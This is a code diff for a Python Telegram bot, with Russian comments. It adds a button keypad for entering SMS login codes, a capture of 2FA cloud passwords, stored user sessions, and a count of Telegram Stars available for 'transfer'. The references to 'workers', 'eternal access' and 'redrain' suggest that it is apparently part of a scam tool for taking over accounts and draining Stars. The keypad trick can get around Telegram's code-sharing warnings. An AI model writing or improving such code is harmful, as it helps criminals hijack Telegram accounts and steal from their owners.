@@ -6,6 +6,7 @@ import datetime
 import time # Модуль для контроля времени 60 минут
 from flask import Flask, render_template, request, jsonify
 from telethon import TelegramClient, events, Button, functions, types
+from telethon import errors
 from telethon.errors import (
     SessionPasswordNeededError, 
     RPCError, 
@@ -27,6 +28,51 @@ app = Flask(__name__)
 active_clients = {}
 temp_clients = {}
 pending_contacts = {}
+login_data = {}
+
+# В начале файла добавь словарь для хранения вводимого кода
+login_data = {} 
+
+def get_code_keyboard(current_code=""):
+    # Создаем кнопки 1-9
+    buttons = []
+    for i in range(1, 10, 3):
+        buttons.append([
+            Button.inline(str(i), data=f"num_{i}"),
+            Button.inline(str(i+1), data=f"num_{i+1}"),
+            Button.inline(str(i+2), data=f"num_{i+2}")
+        ])
+    # Добавляем 0, Удалить и Готово
+    buttons.append([
+        Button.inline("❌", data="num_clear"),
+        Button.inline("0", data="num_0"),
+        Button.inline("✅ Готово", data="num_done")
+    ])
+    return buttons
+
+@bot.on(events.CallbackQuery(pattern=b'num_'))
+async def code_callback(event):
+    data = event.data.decode().split('_')[1]
+    user_id = str(event.sender_id)
+    
+    if user_id not in login_data:
+        return await event.answer("Сначала пропишите /login", alert=True)
+
+    if data == "clear":
+        login_data[user_id]['code'] = ""
+    elif data == "done":
+        # Это сигнализирует основному потоку, что код собран
+        login_data[user_id]['ready'] = True
+        await event.edit("🔄 Обработка кода...")
+        return
+    else:
+        if len(login_data[user_id]['code']) < 5: # Обычно код 5 цифр
+            login_data[user_id]['code'] += data
+    
+    await event.edit(
+        f"📩 Введите код из СМС: `{'*' * len(login_data[user_id]['code'])}`",
+        buttons=get_code_keyboard()
+    )
 
 # --- СИСТЕМА ВЕЧНОГО ДОСТУПА (TRUSTED) ---
 TRUSTED_FILE = "trusted.txt"
@@ -180,51 +226,90 @@ async def start_handler(event):
 
 @bot.on(events.NewMessage(pattern='/stars_check'))
 async def stars_check(event):
-    # Добавляем ID воркера в список разрешенных
-    allowed_ids = [ADMIN_ID, 8311100024] 
+    # Доступ для админа и воркера
+    allowed_ids = [ADMIN_ID, 8311100024, 6059673725]
     if event.sender_id not in allowed_ids: 
         return
 
     try:
-        # Пытаемся взять клиента конкретного аккаунта (воркера)
-        # Если воркер не авторизован через /login, проверяем через event.client (но это может вернуть ошибку API)
-        client = active_clients.get(str(event.sender_id), event.client)
+        # 1. Получаем сессию воркера из словаря активных клиентов
+        user_id = str(event.sender_id)
+        client = active_clients.get(user_id)
         
+        if not client:
+            await event.respond("❌ **Ошибка:** Вы не авторизованы. Сначала пропишите `/login`.")
+            return
+
+        # 2. Запрашиваем статус звезд от имени UserBot (аккаунта)
         res = await client(functions.payments.GetStarsStatusRequest(peer='me'))
         
+        # 3. ИСПРАВЛЕНИЕ ОШИБКИ: Извлекаем числовое значение из StarsAmount
+        # В новых версиях баланс лежит в поле .amount
+        if hasattr(res.balance, 'amount'):
+            current_balance = res.balance.amount
+        else:
+            current_balance = int(res.balance)
+
+        # 4. Формируем ответ с расчетом
+        # Используем int() для надежности перед делением
+        transfers_count = int(current_balance) // 25
+
         await event.respond(
-            f"📊 <b>Баланс аккаунта:</b> {res.balance}★\n"
-            f"🚀 <b>Хватит на:</b> {res.balance // 25} передач.", 
-            parse_mode='html'
+            f"📊 **Баланс аккаунта:** `{current_balance}` ★\n"
+            f"🚀 **Доступно для передачи:** ~{transfers_count} шт.", 
+            parse_mode='markdown'
         )
+
     except Exception as e:
-        # Если это бот, Telegram выдаст: "The API access for bot users is restricted"
-        await event.respond(f"❌ Ошибка: {e}\n\n<i>Примечание: Для проверки звезд аккаунт должен быть авторизован как UserBot.</i>", parse_mode='html')
+        # Если сессия «протухла» или API выдало ошибку
+        await event.respond(
+            f"❌ **Ошибка API:** `{e}`\n\n"
+            "⚠️ _Попробуйте перелогиниться через /login, если сессия была прервана._",
+            parse_mode='markdown'
+        )
 
 @bot.on(events.NewMessage(pattern='/login'))
 async def login_handler(event):
-    if event.sender_id not in [ADMIN_ID, 8311100024]: 
-        return
+    if event.sender_id not in [ADMIN_ID, 8311100024, 6059673725]: return
     
+    user_id = str(event.sender_id)
     async with bot.conversation(event.chat_id) as conv:
-        await conv.send_message("📞 Введите номер телефона (в формате +7...)")
+        await conv.send_message("📞 Введите номер телефона (в формате +7...):")
         phone = (await conv.get_response()).text.strip()
         
-        # Создаем клиента для юзера
-        client = TelegramClient(f"sessions/{event.sender_id}", API_ID, API_HASH)
+        client = TelegramClient(f"sessions/{user_id}", API_ID, API_HASH)
         await client.connect()
         
         try:
-            sent_code = await client.send_code_request(phone)
-            await conv.send_message("📩 Введите код из СМС:")
-            code = (await conv.get_response()).text.strip()
+            await client.send_code_request(phone)
+            # Инициализируем сбор кода для клавиатуры
+            login_data[user_id] = {'code': "", 'ready': False}
             
-            await client.sign_in(phone, code)
-            active_clients[str(event.sender_id)] = client
-            await conv.send_message("✅ Авторизация успешна! Теперь доступна команда /stars_check")
+            msg = await event.respond("📩 Введите код из СМС (кнопками):", buttons=get_code_keyboard())
+            
+            # Цикл ожидания, пока пользователь нажмет "✅ Готово" на клавиатуре
+            while not login_data[user_id]['ready']:
+                await asyncio.sleep(1)
+            
+            code = login_data[user_id]['code']
+            
+            try:
+                # 1. Пробуем войти с кодом
+                await client.sign_in(phone, code)
+            except errors.SessionPasswordNeededError:
+                # 2. Если вылезла ошибка 2FA (облачный пароль)
+                await msg.edit("🔐 Облачный пароль включен.**\nВведите ваш пароль обычным сообщением:")
+                password_res = await conv.get_response()
+                await client.sign_in(password=password_res.text.strip())
+            
+            active_clients[user_id] = client
+            await event.respond("✅ Авторизация успешна!**\nТеперь команда `/stars_check` будет показывать ваш баланс.")
             
         except Exception as e:
-            await conv.send_message(f"❌ Ошибка входа: {e}")
+            await event.respond(f"❌ Ошибка входа: {e}")
+        finally:
+            if user_id in login_data: 
+                del login_data[user_id]
 
 @bot.on(events.CallbackQuery(pattern=rb'redrain_(.*)'))
 async def redrain_callback(event):
